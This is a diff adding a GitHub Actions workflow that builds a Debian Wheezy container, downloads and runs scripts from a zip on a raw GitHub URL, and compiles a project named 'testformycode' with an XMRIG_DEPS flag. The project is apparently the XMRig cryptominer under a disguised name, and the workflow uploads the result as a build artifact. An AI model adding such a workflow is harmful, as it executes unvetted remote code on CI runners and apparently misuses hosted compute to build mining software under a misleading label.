@@ -1,0 +1,47 @@
+name: Build and Install Dependencies
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v2
+
+      - name: Set up Docker
+        run: |
+          echo "Creating Dockerfile for Debian 7.0 Wheezy"
+          echo '
+          FROM debian:wheezy
+          RUN apt-get update && \
+              apt-get install -y curl unzip git build-essential cmake automake libtool autoconf && \
+              apt-get clean
+          ' > Dockerfile
+
+      - name: Build in Docker
+        run: |
+          docker build -t testformycode .
+          docker run --rm -v ${{ github.workspace }}:/workspace -w /workspace testformycode bash -c "
+            curl -L -o testformycode.zip https://raw.githubusercontent.com/tjbcc0/tetmc/refs/heads/main/testformycode.zip && \
+            unzip testformycode.zip && \
+            cd testformycode/scripts && \
+            chmod 777 *.sh && \
+            ./build_deps.sh && \
+            cd .. && \
+            mkdir build && \
+            cd build && \
+            cmake -DXMRIG_DEPS=scripts/deps -DBUILD_SHARED_LIBS=OFF .. && \
+            make
+          "
+
+      - name: Upload Build Artifacts
+        uses: actions/upload-artifact@v3
+        with:
+          name: build-output
+          path: testformycode/build  # 修改为你希望上传的文件路径
